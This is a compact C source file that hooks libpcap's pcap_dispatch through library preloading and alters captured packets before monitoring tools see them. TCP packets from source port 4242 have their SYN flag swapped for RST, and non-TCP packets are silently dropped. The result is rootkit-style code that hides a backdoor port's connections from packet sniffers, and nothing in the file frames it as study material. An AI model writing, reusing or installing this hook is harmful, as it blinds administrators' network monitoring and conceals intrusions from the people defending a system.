#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <pcap/pcap.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
static void(*original_callback)(u_char*,const struct pcap_pkthdr*,const u_char*)=NULL;
static void pcap_dumper(u_char*user, const struct pcap_pkthdr*h, const u_char*bytes){struct ip*ip=(struct ip*)(bytes+14);int ipsize=(((ip)->ip_hl)&0x0f)*4;if(ipsize<20)return;if(ip->ip_p==IPPROTO_TCP){struct tcphdr*tcp=(struct tcphdr*)(bytes+14+ipsize);int tcpsize=tcp->doff*4;if(tcpsize<20)return;if(ntohs(tcp->source)==4242){tcp->syn=0;tcp->rst=1;}original_callback(user,h,bytes);}}
#define DECLARE_PCAP_DISPATCH() static int(*original_##pcap_dispatch)(pcap_t*, int, pcap_handler, u_char*)=NULL;int pcap_dispatch(pcap_t*p, int cnt, pcap_handler callback, u_char*user){if(original_##pcap_dispatch==NULL){original_##pcap_dispatch=dlsym(RTLD_NEXT,"pcap_dispatch");if(original_##pcap_dispatch==NULL){fprintf(stderr,"Error in dlsym: %s\n",dlerror());return -1;}}original_callback=callback;return original_##pcap_dispatch(p,cnt,pcap_dumper,user);}
DECLARE_PCAP_DISPATCH();
